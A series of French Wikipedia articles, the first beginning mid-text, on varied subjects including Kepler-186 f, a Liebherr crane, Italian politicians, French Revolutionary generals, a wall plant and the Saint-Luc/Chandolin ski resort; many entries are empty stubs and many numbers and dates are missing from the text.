Selon les déclarations à Reuters de Michel Sefionam, du centre médical de Grimari et membre de la Croix-Rouge, les affrontements ont fait cinq tués chez les Seleka et deux du côté des Anti-Balaka le , la plupart des victimes sont cependant de civils, il y aurait au total 22 morts.
De son côté, le capitaine Ahmat Nidjab Ibrahim, un officier Séléka dans la région, affirme que ses forces ont tué 95 combattants ennemis et perdu un homme lors des combats livrés depuis le .
Selon l'AFP, des habitants de la ville ont également accusé les Seleka d'avoir abattu une trentaine de civils.

</doc>
<doc id="7902793" url="https://fr.wikipedia.org/wiki?curid=7902793" title="Antonio Cancian">
Antonio Cancian



</doc>
<doc id="7902811" url="https://fr.wikipedia.org/wiki?curid=7902811" title="Marco Rizzo">
Marco Rizzo

Marco Rizzo (né le à Turin) est un homme politique italien.
Il adhère au Parti communiste italien en 1981 jusqu'à sa dissolution, puis en 1991 au Parti de la refondation communiste et ensuite en 1998 au Parti des communistes italiens. En , il est exclu du Parti des communistes italiens pour avoir soutenu Gianni Vattimo aux élections européennes du même mois. Il fonde alors son propre mouvement, "Comunisti Sinistra Popolare" (Communistes gauche populaire) qui est rebaptisé Parti communiste en .
Il est député européen de 2004 à 2009.

</doc>
<doc id="7902817" url="https://fr.wikipedia.org/wiki?curid=7902817" title="Kepler-186 f">
Kepler-186 f

Kepler-186 f est la première exoplanète de taille terrestre située dans la zone habitable de son étoile à avoir été découverte. Elle orbite autour de Kepler-186, une naine rouge située dans la constellation du Cygne, entre 490 et 500 années-lumière de la Terre. Elle a été découverte grâce au télescope spatial Kepler, chargé de détecter des exoplanètes dans une petite zone fixe du ciel.
Nom.
Le nom Kepler-186 f a été donné à la planète car elle a été découverte grâce aux informations fournies par le télescope "Kepler" de 2009 à 2013.
Le nombre 186 fait référence au système planétaire et la lettre « f » fait référence à l'ordre de la découverte de cette exoplanète autour de Kepler-186. Cette lettre a été attribuée comme d'accoutumée : dans un système stellaire, la lettre « a » est réservée à l'étoile, la première planète découverte hérite de la lettre « b », la deuxième de la lettre « c », la troisième de la lettre « d » La cinquième planète découverte autour de Kepler-186 est ainsi dénommée .
L'étoile Kepler-186.
Kepler-186 est une naine rouge (0,5 fois la masse du Soleil) qui forme un système exoplanétaire composé à l'heure actuelle de cinq planètes nommées Kepler-186 b, Kepler-186 c, Kepler-186 d, Kepler-186 e et , toutes de tailles proche de celle de la Terre. est la planète occupant l'orbite la plus éloignée de l'étoile et est la seule des cinq planètes connues à ce jour qui soit dans la zone habitable (présence d'eau liquide possible).
Découverte.
Kepler-186 f a été découverte en même temps que les quatre planètes plus proches de leur étoile, grâce à l'exploitation de données récoltées entre 2009 et 2013 par le télescope spatial "Kepler" de la NASA.
En , près de sont confirmées. Avec celles du système Kepler-186, une vingtaine sont situées dans la zone habitable, mais est celle dont la taille est la plus proche de celle de la Terre. La plupart des autres sont plus grosses et il est donc difficile de déterminer si elles sont gazeuses ou rocheuses.
Caractéristiques.
Elle est située entre 490 et de la Terre soit environ entre et .
Le record de vitesse interplanétaire est d'environ par heure (détenu par la sonde Helios 2), soit un temps de trajet Terre - Kepler-186 f de plus de deux millions d'années (entre et ).
Caractéristiques orbitales.
Kepler-186 f est la cinquième planète en termes de distance du système Kepler-186. Sa période orbitale est de , ce qui la place dans la zone habitable de son étoile.
Caractéristiques physiques.
Kepler-186 f a une taille similaire à la Terre. La planète a été détectée par la méthode des transits. Sa masse n'est pas connue, mais est estimée entre . Si la planète réunit les conditions pour être habitable, alors elle le serait pour une longue durée, la durée de vie des naines rouges comme Kepler-186 étant de plusieurs dizaines de milliards d'années.
Habitabilité.
Étant donné sa masse et la distance à laquelle Kepler-186 f se trouve de son étoile, il est possible que la planète possède de l'eau liquide à sa surface. En effet, la température en surface de pourrait dépasser si son atmosphère comprenait une pression partielle de CO2 comprise entre . Rien n'est cependant certain pour le moment et la présence d'eau liquide sur la planète n'est pas un critère suffisant d'habitabilité.

</doc>
<doc id="7902821" url="https://fr.wikipedia.org/wiki?curid=7902821" title="Liebherr LTM 11200">
Liebherr LTM 11200

La LTM 11200 est une grue mobile du constructeur Liebherr, produite à Ehingen (Donau). Il s'agit de la grue mobile à flèche télescopique la plus haute de la gamme du constructeur et l'une des trois plus puissantes du marché. Elle a été présentée pour la première fois à l'occasion du salon Bauma en 2007. Elle est la première grue télescopique à pouvoir soulever . Le premier exemplaire a été livré à Mammoet en 2008. Elle peut être utilisée pour ériger une éolienne.
Caractéristiques techniques.
La Liebherr LTM 11200-9.1 (nom complet) présente une configuration de grue géante : la charge maximale d'utilisation (CMU) est de pour une portée de et un contrepoids de , les de renfort (haubanage) disposés en « Y » permettant d'augmenter la capacité de charge. Sans l'équipement spécial complet, la CMU est de « seulement » à . Le châssis comporte , tous directeurs, et 4 sont moteurs. La flèche télescopique d'une longueur maximale de possède ; une fléchette à treillis (extension à volée variable) peut ajouter , pour une hauteur de levage maximale de . Chacun des de calage peut supporter jusqu'à . Sur la plaque de base de du contrepoids, il est possible d'empiler jusqu'à en fonte haute densité d'un poids de chacun, et de chacun, soit un lest total de . La flèche télescopique est transportée séparément sur une semi-remorque ; elle pèse entre 52 et selon sa configuration.
Grues concurrentes.
La CMU de ce modèle est égalée par l'AC1000 de Terex et la QAY1200 de XCMG.
La grue pilote QAY 2000 de Zoomlion, apparue en 2012, affiche quant à elle une CMU de .

</doc>
<doc id="7902823" url="https://fr.wikipedia.org/wiki?curid=7902823" title="Jiri Naceradsky">
Jiri Naceradsky



</doc>
<doc id="7902839" url="https://fr.wikipedia.org/wiki?curid=7902839" title="Senya Ichiya Monogatari">
Senya Ichiya Monogatari



</doc>
<doc id="7902851" url="https://fr.wikipedia.org/wiki?curid=7902851" title="La Cinquième Saison">
La Cinquième Saison

La Cinquième Saison est un film dramatique belge réalisé par Peter Brosens et Jessica Woodworth et sorti en 2012.
Le film a été sélectionné pour participer à la Mostra de Venise 2012 et a reçu quatre nominations à la quatrième cérémonie des Magritte du cinéma en 2014.
Le film, dramatique et parfois catastrophique, est le dernier chapitre d'une trilogie (après "Khadak" et "Altiplano") sur le conflit entre l'homme et la nature par la paire Peter Brosens et Jessica Woodworth. Le film traite de la décadence progressive des habitants d'un petit village belge où l'hiver ne semble pas vouloir prendre fin.
Production.
Le film est tourné à Weillen, dans la commune de Onhaye.
La première scène du film est tournée à l'intérieur de la crypte romane de Thynes (commune de Dinant).

</doc>
<doc id="7902853" url="https://fr.wikipedia.org/wiki?curid=7902853" title="Troisième bataille d'Ypres">
Troisième bataille d'Ypres



</doc>
<doc id="7902854" url="https://fr.wikipedia.org/wiki?curid=7902854" title="Parietaria judaica">
Parietaria judaica

Parietaria judaica, la Pariétaire de Judée, Pariétaire diffuse ou Pariétaire des murs, est une espèce de plantes à fleurs de la famille des "Urticaceae".
C'est une plante herbacée vivace.
Très présente en ville, saxicole, elle est encore surnommée "épinard de murailles". Elle s'accroche à toutes sortes de parois et sa floraison est peu voyante.
Comme celui de l'espèce proche "Parietaria officinalis", son pollen est très allergisant.
Nomenclature et étymologie.
L’espèce a été décrite et nommée "Parietaria judaica" par Linné en 1756 dans Flora Palaestina 32.
Le nom de genre "Parietaria" est un emprunt au latin du nom d’une plante croissant sur les murs, dérivé de "paries", génitif "parietis", « mur ».
L’épithète spécifique "judaica" est un emprunt au latin, signifiant .
Synonymie.
Selon Tropicos, les synonymes sont:
Description.
La Pariétaire de Judée est une plante vivace, ligneuse à la base, au port ramifié et couché-ascendant, de 20 à de haut.
La tige de de diamètre (alors que celle de "P. officinalis" est de ) est rameuse, de couleur généralement rougeâtre et porte de fins poils mous, lui donnant une teinte grise.
Les feuilles sont alternes, pétiolées, à limbe ovale à lancéolé-elliptique, d’un vert foncé brillant, avec un apex brusquement acuminé à longuement atténué, de de longueur sur de large, couvertes de poils hirsutes blancs surtout sur le revers, rendant la plante « collante ».
Les fleurs petites, verdâtres et sans corolle, sont groupées par 3 à 5 en petits glomérules à l’aisselle des feuilles. Les bractées sont soudées à la base.
Sur la même plante, on trouve trois types de fleurs:
Le pollen qu’elles projettent est très allergisant.
La floraison va de d’avril à octobre.
Les fruits sont des akènes ellipsoïdes, de toute petite dimension ().
Distribution.
Elle est originaire de:
Elle a été introduite en : Argentine Nord-Est, Autriche, Californie, Chili Central, Tchécoslovaquie, Danemark, Finlande, Floride, Hongrie, Jamaïque, Louisiane, Michigan, New Jersey, Nouvelle-Galles du Sud, New York, Norvège, Pennsylvanie, Pérou, Australie-Méridionale, Suède, Texas, Uruguay, Victoria, Australie occidentale, Yémen.
Elle est commune dans pratiquement toute la France métropolitaine, Corse comprise. Son habitat privilégié correspond aux zones rudérales et délaissées, comme les vieux murs en pierres, les friches et les décombres, sur des sols globalement secs récemment remaniés ou fortement nitratés.
"Parietaria judaica" et "Parietaria officinalis".
Les deux espèces se ressemblent mais peuvent être distinguées par les caractères suivants:
Propriétés et utilisations.
Allergie.
Dans tous les pays méditerranéens, le pollen de pariétaire est une des sources allergéniques extérieures la plus importante, avec un grand nombre de sujets présentant des prick tests positifs à la fois au pollen de Parietaria judaïca et au pollen de Parietaria officinalis. Elle est responsable de rhino-conjonctivites et d’asthmes sévères.
Alimentation.
La pariétaire riche en mucilage, tanins, flavonoïdes, calcium, nitrate de potassium, silice et soufre, se consomme intégralement. Les feuilles et tiges finement coupées peuvent être consommées crues en salade ou cuites, en gratin ou en soupe. Elle a tenu lieu d’aliment de disette à la première saison.
Médecine traditionnelle.
Dans les pharmacopées traditionnelles, elle était réputée pour ses propriétés astringentes, diurétiques, émollientes, et vulnéraires prescrite comme dépuratif et pour traiter certains problèmes urinaires et rénaux, et hépatiques.

</doc>
<doc id="7902860" url="https://fr.wikipedia.org/wiki?curid=7902860" title="Enseignement supérieur au Mali">
Enseignement supérieur au Mali

L'enseignement supérieur au Mali est le secteur de l'éducation qui est sous la tutelle du ministère de l'Enseignement supérieur et de la Recherche scientifique. L'université de Bamako, qui est l'une des plus jeunes universités de l'Afrique occidentale, a ouvert ses portes en 1996.
Pour résorber les difficultés récurrentes auxquelles l'enseignement supérieur était confronté à savoir les effectifs pléthoriques, le deficit d'enseignants, le chevauchement des années universitaires, le manque de support administratif et pédagogique. En , des reformes ont été entreprises pour aboutir à la création de plusieurs entités d'université en divisant l'université de Bamako qui regroupait dans le temps toutes les facultés. Ainsi par le conseil des ministres sur la proposition du ministre de l'enseignement supérieur d'alors Siby Ginette Bellegarde, l'université de Bamako a été scindée en quatre universités.
Les différentes universités au Mali.
Universités publiques.
Les universités et grandes écoles publiques présentes au Mali sont : 

</doc>
<doc id="7902866" url="https://fr.wikipedia.org/wiki?curid=7902866" title="Amphitryon (film)">
Amphitryon (film)

Amphitryon : Aus den Wolken kommt das Glück est un film allemand réalisé par Reinhold Schünzel, sorti en 1935.
Le film est une adaptation des pièces de Plaute, de Molière et de Kleist.
Le même film fait l'objet d'une production française : "Les dieux s'amusent" réalisé par Reinhold Schünzel et Albert Valentin, sorti la même année.
Synopsis.
Les femmes de Thèbes sont désespérées : Quand leurs maris vont-ils rentrer de la guerre contre la Béotie ? Bien qu'Alcmène semble plus optimiste que les autres habitants, elle est aussi plus chagrinée : elle prie Jupiter de mettre fin rapidement à la guerre. Mais le dieu dort profondément et n'entend pas d'abord l'appel à l'aide, il est réveillé par le bruit des patins de Mercure. Alors que Mercure rejette les gens, Jupiter prend soin d'Alcmène. Il aimerait apparaître dans sa divinité, estimant qu'il tient son épouse Junon sous sa coupe. Il prétend devoir aller à Thèbes pour soigner en cure un mal de dos alors qu'elle lui fait remarquer que les meilleurs médecins se trouvent à Sparte. Par ailleurs, il demande à Mercure de l'accompagner, ce qui le surprend.
Jupiter et Mercure arrivent discrètement sur Terre et vont à Thèbes, où ils voient que leurs statues sont adorées par les femmes, mais pas de la même façon, Mercure est aimé pour son corps jeune et musclé. La chevelure de la statue de Jupiter est à moitié chauve. Les premières avances de Jupiter pour Alcmène échouent. Pendant ce temps, la hargneuse et dominante Andria, la servante d'Alcmène, se laisse être abordée par Mercure, parce que son mari, Sosie, qui se trouve avec Jupiter, est un buveur notoire. Mercure demande de la laisser lui offrir un chapeau.
Puisque Alcmène est amoureuse de son mari Amphitryon, Jupiter décide de se faire passer pour lui. Mercure fait de même avec moins d'enthousiasme. Les deux se rendent auprès de leurs « épouses ». Mercure fait face aux reproches d'Andria qui rêve de ce chapeau qu'on lui a proposé alors que son mari est un bon à rien. De son côté, Jupiter espère rapidement avoir une nuit d'amour avec Alcmène. Mais elle lui fait boire du muscat de Samos, la boisson préférée d'Amphitryon, que Jupiter déteste. Il se couche auprès d'elle mais a la gueule de bois. Andria, elle, est étonnée que son mari ne boit plus et veut se laver.
Le lendemain matin, le vrai Sosie rentre à la maison. Il trouve Mercure à sa place et est arrêté par le vrai Amphitryon qui le croit ivre de bon matin. Amphitryon est à son tour surpris, il n'est pas reçu avec tant de joie. Alcmène n'a pas aimé qu'il boive autant la veille. Amphitryon soupçonne un rival d'avoir profité de la mésentente sur le retour et prend un avocat qui n'est rien d'autre que Jupiter. Pendant qu'Amphitryon cherche les preuves d'un adultère, Jupiter revient vers Alcmène en espérant passer à l'acte avec elle. Mais il attrape froid, le médecin lui ordonne de rester au lit.
Junon s'aperçoit de l'infidélité et va au palais d'Alcmène. Elle démystifie son mari qui revient tout penaud. Amphitryon, à son tour, reconnaît que Alcmène lui a toujours été fidèle et se réconcilie avec elle. Sosie connaît également une fin heureuse : Mercure lui offre le chapeau que désirait Andria qui se réconcilie avec son vrai mari.

</doc>
<doc id="7902888" url="https://fr.wikipedia.org/wiki?curid=7902888" title="Bas moyen age">
Bas moyen age



</doc>
<doc id="7902889" url="https://fr.wikipedia.org/wiki?curid=7902889" title="Éditeurs de livre">
Éditeurs de livre



</doc>
<doc id="7902890" url="https://fr.wikipedia.org/wiki?curid=7902890" title="La Minute de Saint-Granier">
La Minute de Saint-Granier

La Minute de Saint-Granier (anciennement appelée "La Minute du bon sens") est une ancienne émission radiophonique quotidienne française, de quelques minutes. Elle a été diffusée à partir de 1935 sur Radio Cité. Puis après guerre vers sur Paris-Inter (maintenant France Inter) jusqu'au moins 1972.
Elle était animée par le chanteur, réalisateur et journaliste Jean de Granier de Cassagnac (dit Saint-Granier) (1890-1976).
Elle abordait des sujets de société ou économiques d'un point de vue conservateur et assez « vieille France », faisant par exemple remarquer que l'on disait « Le président de la République » plutôt que « Monsieur le président de la République ». Il faisait aussi souvent référence à des courriers d'auditeurs qui se plaignaient des comportements, notamment des jeunes « ...qui font du bruit avec leurs pétrolettes » ou « s'amusent à jeter des pétards ».
Elle commençait et se terminait par la phrase rituelle : "Bonsoir, mes chers auditeurs, bonsoir".
Le format sera repris à la télévision par Pierre Desproges, dans un registre autrement provocateur, avec "La Minute nécessaire de monsieur Cyclopède".

</doc>
<doc id="7902893" url="https://fr.wikipedia.org/wiki?curid=7902893" title="Éditeur de livres">
Éditeur de livres



</doc>
<doc id="7902894" url="https://fr.wikipedia.org/wiki?curid=7902894" title="Éditeurs de livres">
Éditeurs de livres



</doc>
<doc id="7902906" url="https://fr.wikipedia.org/wiki?curid=7902906" title="Crews">
Crews

Crews est un patronyme porté notamment par :

</doc>
<doc id="7902907" url="https://fr.wikipedia.org/wiki?curid=7902907" title="J. S. Blazer">
J. S. Blazer



</doc>
<doc id="7902909" url="https://fr.wikipedia.org/wiki?curid=7902909" title="Caterina Chinnici">
Caterina Chinnici

Caterina Chinnici, née le à Palerme, est une magistrate et une personnalité politique italienne, membre du Parti démocrate (PD) puis de Forza Italia.
Biographie.
Son père, le juge Rocco Chinnici, était un magistrat déterminé qui avait décidé de créer une cellule composée de juges qui seraient spécialisés dans les enquêtes complexes liées à la mafia. Il fut assassiné dans un attentat à la voiture piégée le aux premières heures de la matinée, en plein centre de Palerme.
Magistrate comme son père, elle est tête de liste du Parti démocrate dans la circonscription Italie insulaire pour les élections européennes de 2014 en Italie.
Le elle est élue député européen d'Italie de la . Elle est confirmée tête de liste du Parti démocrate dans la circonscription Italie insulaire pour les élections européennes de 2019 en Italie.
Victorieuse des primaires de gauche pour les élections régionales de 2022 en Sicile en battant avec 44,77 % la sous-secrétaire d’État à l’Éducation Barbara Floridia (M5S, 31,74%) et le député régional Claudio Fava (Centopassi, 23,22 %), elle subit le retrait du M5S le 22 août après lequel elle hésite à maintenir sa candidature. Elle finit en troisième position du scrutin derrière le candidat de droite Renato Schifani et l'ancien maire de Messine Cateno De Luca.
Peu après cette défaite, au printemps 2023, elle rejoint Forza Italia. Le parti la désigne comme tête de liste pour les européennes de 2024, toujours pour la circonscription Sicile-Sardaigne. Première non élue derrière les assesseurs régionaux Edy Tamajo et Marco Falcone, elle peut prétendre retrouver son siège au parlement européen su Tamajo démissionne.

</doc>
<doc id="7902912" url="https://fr.wikipedia.org/wiki?curid=7902912" title="Paul Fildes">
Paul Fildes

Paul Gordon Fildes est un pathologiste, microbiologiste et bactériologiste britannique. Né le à Londres, il y est décédé le .
Biographie.
Fils de Luke Fildes, il étudie la chirurgie au Trinity College de Cambridge (1904) puis travaille comme chirurgien lieutenant-commandant dans la Royal Navy et dans un hôpital de la marine (1915-1919). Il rejoint ensuite le Medical Research Council et est nommé chef de l'unité de chimie bactérienne. Il effectue alors d'importants travaux sur les sulfamides (avec Donald D. Woods), sur l'hémophilie et la syphilis.
Pendant la Seconde Guerre mondiale, il travaille dans la base secrète de Porton Down comme chef des études sur les armes chimiques. Il participe, en outre, à l'assassinat de Reinhard Heydrich à Prague. Il assiste aussi aux essais d'anthrax sur l'île Gruinard et pratique des autopsies sur les corps des moutons exposés pour déterminer s'ils sont morts en conséquence directe de l'empoisonnement à l'anthrax. En 1942, il supervise les premières tentatives du Royaume-Uni de développement des armes biologiques. Ses travaux permettent ainsi d'inventer la première bombe à anthrax. Pour la développer, il fait appel aux États-Unis pour produire la bombe à grande échelle et s'installe à Washington (). Il travaille ensuite à un vaste plan de bombardement de l'Allemagne mais la fin de la guerre ne permet pas son exécution. Il continue malgré tout ensuite ses recherches sur les armes biologiques.
Il reçoit en 1963 la médaille Copley pour ses travaux.

</doc>
<doc id="7902915" url="https://fr.wikipedia.org/wiki?curid=7902915" title="Dounia">
Dounia

Dounia (arabe : , littéralement « monde ») est un nom de famille et prénom arabe. 
En langue russe, Dounia est le diminutif du prénom Evdokiya, ou Evdokya, dont l'équivalent en français est Eudoxie.

</doc>
<doc id="7902922" url="https://fr.wikipedia.org/wiki?curid=7902922" title="Pollution des mers">
Pollution des mers



</doc>
<doc id="7902930" url="https://fr.wikipedia.org/wiki?curid=7902930" title="Jeffrey Fisher">
Jeffrey Fisher

Jeffrey Fisher est un compositeur et musicien canadien qui a enregistré et tourné avec plusieurs artistes et groupes québécois, de Harmonium à Leonard Cohen en passant par Diane Dufresne.
Carrière.
Jeffrey Fisher a remplacé Serge Locat aux claviers au sein d'Harmonium en 1977 pour les derniers mois de la carrière du groupe. Puis en 1978, il retrouve Serge Fiori pour l'album "Deux cents nuits à l'heure" avec Richard Séguin. Il a aussi fait partie du groupe de jazz fusion québécois UZEB, comme musicien de tournée; toutefois il n'enregistra aucun album avec eux. Il tourne avec Diane Dufresne en Europe, il apparaît d'ailleurs sur les albums tirés des concerts à l'Olympia de Paris tous deux sortis en 1978. En 1982, on peut l'entendre sur l'album live de Carole Laure et son conjoint Lewis Furey au Théâtre de la Porte-Saint-Martin. Il collabore avec Carole encore pour deux autres albums, "She Says Move On" en 1991 et "Sentiments naturels" en 1997. En 1988, par l'entremise de Lewis Furey, Fisher rencontre Leonard Cohen pour lequel il joue sur une chanson, "First We Take Manhattan" de son album "I'm Your Man". Puis il le rejoint à nouveau en 1992 pour l'album "The Future". Il a aussi assisté en tournée Jean-Pierre Ferland et Céline Dion, entre autres. 
Plus récemment, il est compositeur spécialisé dans les bandes sonores pour la télévision. Il est surtout connu pour avoir composé la bande originale de "Fais-moi peur !" (48 des 91 épisodes). Il a également composé la musique pour des émissions produites par CINAR tels que "Et voici la petite Lulu", "Les Baskerville" et "Bêtes à craquer". Il a été quatre fois lauréat d'un prix de la SOCAN, catégorie « Télévision internationale ».
Liens externes.
 

</doc>
<doc id="7902931" url="https://fr.wikipedia.org/wiki?curid=7902931" title="Hôtel Opus">
Hôtel Opus



</doc>
<doc id="7902935" url="https://fr.wikipedia.org/wiki?curid=7902935" title="La minute du bon sens">
La minute du bon sens



</doc>
<doc id="7902938" url="https://fr.wikipedia.org/wiki?curid=7902938" title="Paul Berg (snowboard)">
Paul Berg (snowboard)

Paul Berg, né le à Bergisch Gladbach, est un snowboardeur allemand spécialiste de snowboardcross.
Son frère Luca concourt également au niveau international en snowboard.
Carrière.
En 2014, il participe au cross des Jeux olympiques de Sotchi, arrivant jusqu'en quarts de finale. Un mois plus tard, il remporte sa première victoire de Coupe du monde à La Molina, lui permettant de terminer deuxième au classement en cross.

</doc>
<doc id="7902940" url="https://fr.wikipedia.org/wiki?curid=7902940" title="Joseph Placide Alexandre Léorier">
Joseph Placide Alexandre Léorier

Joseph Placide Alexandre Léorier, né le à Châlette-sur-Loing (Loiret), mort le à Paris, 3, galerie Colbert, est un général de brigade de la Révolution et de l’Empire et un agronome. Il est fils de Pierre Alexandre Léorier de L'Isle, directeur et propriétaire des manufactures de papier de Buges, à Corquilleroy, et de Langlée, à Chalette-sur-Loing.
États de service.
Il sert d'abord dans la garde nationale, puis, le , se porte volontaire dans le de volontaires du Loiret. Il est élu lieutenant le suivant, et lieutenant-colonel commandant du bataillon le . De 1792 à 1794, il sert à l’armée des Ardennes, et il est promu général de brigade à titre provisoire le , par les représentants du peuple Hentz et Bar, promotion confirmée le ; il devient ainsi, à 21 ans et 6 mois, le plus jeune général de la Révolution et de l'Empire hors Louis-Philippe d'Orléans, futur roi des Français (nommé lieutenant-général le , à 18 ans et 11 mois) mais le suivant, il refuse ce grade et est replacé dans son bataillon. Il est promu, à l'amalgame, chef de la d’infanterie de bataille le .
Il quitte le service le , pour aider son père dans la fabrique de papier d’assignats de Buges. Il est aussi directeur des contributions indirectes à Tonnerre, membre de la société d’agriculture de l’arrondissement de Tonnerre et correspondant de la société royale et centrale d’agriculture de Paris.

</doc>
<doc id="7902946" url="https://fr.wikipedia.org/wiki?curid=7902946" title="Effectif actuel des Sharks de San José">
Effectif actuel des Sharks de San José



</doc>
<doc id="7902957" url="https://fr.wikipedia.org/wiki?curid=7902957" title="Jean-François Lepaige">
Jean-François Lepaige

Jean François Lepaige, né le à Lunéville (duché de Lorraine), mort le à Aix-en-Provence (Bouches-du-Rhône), est un général français de la Révolution et de l’Empire.
États de service.
Il entre en service le , comme cadet gentilhomme dans la compagnie du roi de Pologne, duc de Lorraine et le , il devient élève dans l’artillerie. Il est nommé lieutenant le , et de 1761 à 1764, il sert sur les batteries de la côte de Lille. Capitaine le , il est affecté sur les côtes de Cherbourg en 1778, jusqu’en 1783. Il est promu aide major de la d’artillerie de la marine le .
Le , il devient lieutenant-colonel du d’infanterie de la marine, et il sert dans l’armée des côtes de Brest de 1793, à 1796. Il est promu chef de brigade le , à la d’artillerie de marine.
Il est nommé colonel le , au d’artillerie de la marine. Il est fait chevalier de la légion d’honneur le .
Il est promu général de brigade le , et il est admis à la retraite le même jour.
Il est le frère du général Jean Marie Pierre Lepaige, comte Dorsenne (1773-1812)

</doc>
<doc id="7902959" url="https://fr.wikipedia.org/wiki?curid=7902959" title="Effectif actuel des Canucks de Vancouver">
Effectif actuel des Canucks de Vancouver



</doc>
<doc id="7902967" url="https://fr.wikipedia.org/wiki?curid=7902967" title="Rue de la 1re Armée">
Rue de la 1re Armée

La rue de la Armée est une rue de la ville de Strasbourg, en France.
Situation et accès.
La rue est située dans le quartier de la Bourse, qui est englobé dans le quartier Bourse - Esplanade - Krutenau
D'une longueur d'environ , elle est le prolongement de la rue de la Division-Leclerc et débute au niveau du quai Saint-Nicolas. Elle adopte un tracé orienté globalement sud-est et se termine quai Fustel-de-Coulanges.
La rue est à sens unique sur l'ensemble de son tracé.
Les lignes de tramway A et D parcourent l'ensemble de la rue, de même que les lignes de bus 14 et 24. Ces lignes ont en commun la station "Porte de l'Hôpital", qui doit son nom à l'entrée toute proche de l'Hôpital Civil.
Les lignes de bus 10 et 15 passent respectivement au nord et au sud de la rue de la Armée.
Origine du nom.
La rue tient son nom de la française qui placée sous les ordres du général de Lattre de Tassigny a libérée l'Alsace et Strasbourg en 1945.
Historique.
La rue fait partie de la Grande-Percée, important projet urbain de modernisation du centre historique de Strasbourg réalisé entre 1910 et 1960.
En 1872 après l'annexion de l'Alsace-Lorraine elle porte le nom de « Börsenstrasse » avant de prendre en 1918, le nom de « rue de la Bourse », pour redevenir durant l'occupation en 1940 « Börsenstrasse » puis en 1942 «  Karl-Hauss-Strasse » du nom de l'homme politique du Reich et de l'Empire allemand, Karl Hauss (1871-1925). La rue devient « rue de la Armée » à la Libération.

</doc>
<doc id="7902969" url="https://fr.wikipedia.org/wiki?curid=7902969" title="Selina Joerg">
Selina Joerg



</doc>
<doc id="7902971" url="https://fr.wikipedia.org/wiki?curid=7902971" title="Alessandra Moretti">
Alessandra Moretti

Alessandra Moretti, née le à Vicence, est une femme politique italienne, membre du Parti démocrate (PD).
Biographie.
Elle est tête de liste de son parti lors des élections européennes de 2014 pour l'Italie du Nord-Est.
Elle est élue député européen d'Italie de la le .
Elle démissionne du Parlement européen le pour conduire la campagne du Parti démocrate aux élections régionales de 2015 en Vénétie.
Affaire du Parlement européen.
Mise en cause (présumée innocente) dans le scandale des pots-de-vin de lobbyistes de pays du Golfe reçus par des politiques (parlementaires européens, assistants, etc.), l’eurodéputée Moretti se défend de tout lien avec le dossier. Son nom est à nouveau cité dans un mandat d'arrêt émis le 10 février 2023 dans le cadre du scandale de corruption par le Qatar au Parlement européen et selon lequel elle ferait partie d'un quatuor comprenant également Marc Tarabella, Marie Arena et Andrea Cozzolino.

</doc>
<doc id="7902974" url="https://fr.wikipedia.org/wiki?curid=7902974" title="Guillaume Lepéduchelle">
Guillaume Lepéduchelle

Guillaume Lepéduchelle dit Péduchelle, né le à Paris, mort le à Rozérieulles (Moselle), est un général de brigade de la Révolution française.
Biographie.
Guillaume Lepéduchelle, né en 1740, est le fils d'un garde-française. 
Lepéduchelle entame la carrière des armes comme soldat dans le Régiment de Piémont en 1758 et y reste jusqu'en 1787, époque à laquelle il se retire de l'armée avec le grade d'adjudant-sous-officier. Avec ce régiment, il sert notamment en Allemagne de 1758 à 1762, puis en Corse de 1776 à 1778.
Il est ensuite maçon et devient major dans la garde nationale de Metz. Avec l'avènement des bataillons de volontaires, il est élu lieutenant-colonel en second du de volontaires de la Moselle le dirigé par Hyacinthe Roger-Duprat. Il sert à l'Armée de la Moselle de 1792 à 1794. Il participe à la défense du siège de Thionville puis à l'expédition de Trèves. Péduchelle reçoit la Croix de Saint-Louis en cette même année 1792. Il est promu général de brigade à l’armée de la Moselle le . En , il prend le commandement de Thionville et à ce titre est témoin au mariage de Lazare Hoche. En octobre 1794, il commande une brigade au siège et à la prise de Luxembourg. Il s'y est notamment distingué avec sa brigade au combat de la Forêt de Grunemwald et en février 1795, il y commandait la division de l'armée aux ordres du général Ambert.
Du à 1800, il sert dans la division militaire. Il est admis à la retraite le et l'est effectivement en 1801.
Il se retire à Metz et meurt le à Rozérieulles.

</doc>
<doc id="7902992" url="https://fr.wikipedia.org/wiki?curid=7902992" title="Saint-Luc/Chandolin">
Saint-Luc/Chandolin

Saint-Luc/Chandolin est une station de ski de Suisse située sur les territoires des deux localités de Saint-Luc et de Chandolin, dans la commune d'Anniviers, dans le val d'Anniviers dans le canton du Valais.
Domaine skiable.
La majorité du domaine skiable est desservie par des téléskis de construction ancienne. Relativement moins exposé directement au soleil et aussi à plus haute altitude, le manteau neigeux dure comparativement plus longtemps dans la saison, que la station voisine de Crans-Montana, laquelle est située sur l'adret de la vallée du Rhône. La saison de ski se termine généralement fin avril.
Chandolin.
Le plus petit sous-domaine des deux stations est principalement desservi par le télésiège 4-places débrayable de Tsapé, qui part directement du pied de la station à l'altitude de au niveau du parking payant. De son arrivée, il est possible de rejoindre le téléski excentré de l"'Illhorn", qui dessert les flancs de la montagne éponyme, jusqu'à . Le sous-domaine est relié au sous-domaine de Saint-Luc à l'aide du lent télésiège du "Rotzé" (qui sera remplacé pour la saison 2020-2021 par un télésiège fixe 4 place qui partira du bas de l'ancien téléski de la Cret de la Motte jusqu'à la station du haut du télésiège de la forêt). Le domaine freeride de Chandolin, avec ses nombreux couloirs, peut être atteint en remontée mécanique uniquement depuis Saint-Luc, via le téléski du "col des Ombrintzes" à .
Une piste de luge de et de dénivelé complète l'offre touristique à Chandolin, depuis le sommet du télésiège du Tsapé. 5 sentiers ont été aménagés pour la pratique de la raquette à neige.
Saint-Luc.
Un funiculaire de construction récente relie à grande vitesse le secteur d'altitude à "Tignousa", depuis le parking payant situé à une extrémité de la station. Cette remontée mécanique est le symbole de la station. À Tignousa () - là où a été implanté l'observatoire astronomique François-Xavier Bagnoud - les pistes sont majoritairement faciles, et permettent de rejoindre les téléskis sommitaux. Il est ainsi nécessaire d’emprunter trois téléskis pour pouvoir rejoindre le sommet du domaine à la Bella Tola (). De ces trois téléskis existe le plus long tire-fesse "Poma" de Suisse, le "Pas de Bœuf", qui mesure plus de deux kilomètres de long. Cette partie excentrée du domaine offre des possibilités de pratique du ski hors-piste. Une très longue piste rouge part du sommet et rejoint, près de plus bas, le hameau du "Prilet". De là part un skibus - toutes les 20 minutes en après-midi - pour rejoindre le départ du funiculaire. Le sous-domaine accueille un snowpark.
La station coopère au travers d'une offre forfaitaire commune avec les stations voisines de Grimentz, Zinal et Vercorin, mais aussi avec l'offre Valais SkiCard.
Pendant l'été, le télésiège Chandolin - Le Tsapé et le funiculaire Saint-Luc - Tignousa fonctionnent.
